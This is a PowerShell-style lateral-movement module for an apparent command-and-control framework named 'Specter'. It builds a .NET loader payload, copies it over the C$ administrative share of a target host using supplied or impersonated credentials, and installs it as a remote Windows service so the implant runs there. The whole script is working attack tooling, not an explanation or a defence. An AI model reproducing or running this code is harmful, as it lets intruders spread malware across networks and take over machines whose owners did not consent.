param(
    [Parameter(ParameterSetName="Impersonate", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [ValidateNotNullOrEmpty]
    [string]$Target,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The local or domain username to authenticate with.")]
    [ValidateNotNullOrEmpty]
    [string]$Username,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The password for the specified user.")]
    [ValidateNotNullOrEmpty]
    [string]$Password,

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [ValidateNotNullOrEmpty()]
    [Build]
    [string]$Build,

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The folder where the service directory will be created.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The folder where the service directory will be created.")]
    [ValidateNotNullOrEmpty()]
    [string]$Directory = "C:\Program Files\",

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The type of payload to drop.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The type of payload to drop.")]
    [ValidateSet("csharp_service_load_module", "csharp_service_powershell_host")]
    [string]$Payload = "csharp_service_load_module"
)

load common;
load lateral;

#Generate a new .NET loader
$contents = payload -Build $Build -Kind $Payload;
$config = payload -Build $Build -Kind 'csharp_config';

#Get the filename of the payload
$assembly = [System.Reflection.Assembly]::Load($contents);
$filename = $assembly.GetName();
$serviceName = $filename.Name + "Svc";

#Define the remote paths
$sharePath = "\\$Target\C`$";
$uncRootPath = [System.IO.Path]::Combine([System.IO.Path]::Combine($sharePath, $Directory.Replace("C:\", "")), $filename.Name);
$uncBinaryPath = [System.IO.Path]::Combine($uncRootPath, $filename.Name + ".exe");
$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);
$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + ".exe");

#Copy the payload to the remote system
try {
    if([string]::IsNullOrEmpty($Username)) {
        [void][System.IO.Directory]::CreateDirectory($uncRootPath);
        [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);
        [System.IO.File]::WriteAllText($uncBinaryPath + ".config", $config);

        #Create the service
        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -NoStart:$false;
    } else {
        $credentials = New-Object System.Net.NetworkCredential($Username, $Password);
        $share = [common.IO.TemporaryNetworkShare]::Map($sharePath, $credentials);
        try {
            [void][System.IO.Directory]::CreateDirectory($uncRootPath);
            [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);
            [System.IO.File]::WriteAllText($uncBinaryPath + ".config", $config);
        } finally {
            $share.Dispose();
        }

        #Create the service
        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password -NoStart:$false;
    }
    $success = $true;
} catch {
    $success = $false;
    throw;
}

New-Object psobject -Property @{
    Lateral = New-Object psobject -Property @{
        Method = "System Sevice";
        Path = $localBinaryPath;
        ServiceName = $serviceName;
        Payload = $Payload;
        System = $Target;
        Username = $Username;
        Success = $success;
    };
};